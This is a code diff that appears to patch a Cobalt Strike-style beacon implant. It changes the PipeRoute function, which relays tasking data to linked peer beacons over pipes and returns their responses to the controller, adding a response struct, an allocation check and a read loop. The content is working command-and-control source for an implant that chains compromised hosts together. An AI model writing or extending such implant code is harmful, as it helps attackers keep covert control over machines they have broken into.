@@ -176,16 +176,32 @@ void PipeClose(char* buffer, int length)
 	PipeCloseInternal(bid);
 }
 
-char* gRouteAux = NULL;
+typedef struct _ROUTE_DATA
+{
+	int bid;
+	char data[];
+} ROUTE_DATA;
+
+ROUTE_DATA* gRouteAux = NULL;
 void PipeRoute(char* buffer, int length)
 {
+#define MAX_ROUTE_AUX 0x100000
 	if (!gRouteAux)
-		gRouteAux = malloc(0x100000);
+	{
+		gRouteAux = malloc(MAX_ROUTE_AUX);
+
+		if (!gRouteAux)
+		{
+			LERROR("Could not allocate memory for route aux");
+			return;
+		}
+	}
 
 	datap parser;
 	BeaconDataParse(&parser, buffer, length);
 	int bid = BeaconDataInt(&parser);
 	int baseLen = BeaconDataLength(&parser);
+
 	int len = baseLen;
 	for(int i = 0; i < MAX_LINKS; i++)
 	{
@@ -193,22 +209,47 @@ void PipeRoute(char* buffer, int length)
 			continue;
 
 		PROTOCOL* pProtocol = &gLinks[i].protocol;
-		int wdata;
+		char* wdata;
 		if(len <= 0)
 		{
 			len = 0;
-			wdata = 0;
+			wdata = NULL;
 		} else
 		{
 			len = baseLen;
-			wdata = buffer + 4;
+			wdata = BeaconDataBuffer(&parser);
 		}
 
-		if(pProtocol->write(pProtocol, wdata, len) < 0)
+		if(pProtocol->write(pProtocol, wdata, len) == 0)
 		{
 			PipeCloseInternal(bid);
 			break;
 		}
 
+		gRouteAux->bid = bid;
+
+		int read;
+		if(pProtocol->waitForData(pProtocol, 300000, 10))
+		{
+			read = pProtocol->read(pProtocol, gRouteAux->data, MAX_ROUTE_AUX - offsetof(ROUTE_DATA, data));
+		} else
+		{
+			read = -1;
+		}
+
+		int size = offsetof(ROUTE_DATA, data);
+		if(read <= 0)
+		{
+			if(read != 0)
+			{
+				PipeCloseInternal(bid);
+				continue;
+			}
+		} else
+		{
+			size += read;
+		}
+
+		BeaconOutput(CALLBACK_PIPE_READ, (char*)gRouteAux, size);
 	}
 }
